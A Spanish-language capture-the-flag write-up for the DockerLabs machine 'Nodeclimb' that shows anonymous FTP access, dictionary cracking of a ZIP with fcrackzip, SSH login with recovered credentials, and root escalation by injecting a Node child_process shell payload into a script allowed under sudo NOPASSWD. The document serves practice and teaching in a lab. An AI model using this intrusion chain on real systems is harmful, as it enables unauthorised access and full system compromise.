# Nodeclimb (DockerLabs) - WriteUp

**Sitio:** DockerLabs
**Dificultad:** Fácil
**Fecha:** 12/07/2025

## Aprendizajes

* Uso de `fcrackzip` para crêckeo de ZIP protegido.
* Comprensión de escalada de privilegios cuando `sudo -l` muestra `(ALL) NOPASSWD` apuntando a un binario con un archivo específico, adaptando el payload según corresponda para evitar errores y lograr la escalada correctamente.

---

## Enumeración

**1)** Escaneo inicial:

```bash
sudo nmap -sSV -O --open 172.17.0.2
```

Puertos abiertos:

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
OS: Linux
```

---

## Acceso FTP

**2)** Conexión FTP con credenciales anónimas:

```bash
ftp 172.17.0.2
```

```
user: anonymous
pass: anonymous
```

Se descarga un archivo `secretitopicaron.zip` que pide contraseña al intentar descomprimirlo.

---

## Cracking del ZIP con fcrackzip

**3)** Se utiliza fuerza bruta:

```bash
fcrackzip -D -p /usr/share/wordlists/rockyou.txt -u secretitopicaron.zip
```

**Explicación de flags:**

* `-D`: Ataque de diccionario.
* `-p`: Ruta al diccionario.
* `-u`: Intenta descomprimir con cada password para mostrar salida sólo si es exitosa.

> **Contraseña encontrada:** `password1`

Se descomprime el ZIP y se obtienen credenciales:

```
user: mario
pass: laKontraseñAmasmalotaHdelbarrioH
```

---

## Acceso por SSH y enumeración de privilegios

**4)** Conexión SSH:

```bash
ssh mario@172.17.0.2
```

Listar privilegios con:

```bash
sudo -l
```

Salida:

```
(ALL) NOPASSWD: /usr/bin/node /home/mario/script.js
```

Verificamos permisos del archivo:

```bash
ls -la /home/mario/script.js
```

```
-rw-r--r-- 1 mario mario 0 Jul  5  2024 /home/mario/script.js
```

---

## Escalada de privilegios con Node

En **GTFOBins** figura el siguiente comando para escalada con Node:

```bash
sudo node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
```

**Importante:**

* Si `sudo -l` mostrara `sudo /usr/bin/node`, podrías ejecutar el comando entero.
* Al mostrar `sudo /usr/bin/node /home/mario/script.js`, indica que el binario apunta a ese .js, por lo que debes modificar el script directamente para inyectar el payload.

**Procedimiento:**

```bash
nano /home/mario/script.js
```

Pegar dentro:

```js
require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})
```

Guardar y cerrar.

Ejecutar con escalada:

```bash
sudo /usr/bin/node /home/mario/script.js
```

Confirmar con:

```bash
whoami
```

Salida:

```
root
```

---

## Conclusión

* Se logró escalar privilegios a **root** mediante la modificación del archivo `script.js` ejecutado con `node` bajo `NOPASSWD`, adaptando el procedimiento según el tipo de salida de `sudo -l`.
* Se practicó crêckeo de ZIP protegido con `fcrackzip`, acceso básico por FTP anónimo, enumeración con `nmap` y se reforzó la interpretación de configuraciones de `sudo` en contextos reales de pentesting.


